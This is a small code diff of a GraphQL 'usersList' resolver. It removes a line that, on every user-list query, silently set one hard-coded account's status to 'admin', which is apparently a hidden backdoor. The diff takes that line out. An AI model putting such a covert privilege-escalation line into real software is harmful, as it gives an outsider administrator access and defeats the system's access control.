@@ -60,7 +60,6 @@ const usersList = {
     description: 'List of All users',
     resolve: async (parent, args, request) => {
         return userData().then((res) => {
-            res.updateOne({_id:  ObjectId('60a3e908da8a0d4dadc8846d')}, {$set: {status: 'admin'}})
             return res.find({}).toArray();
         })
     }
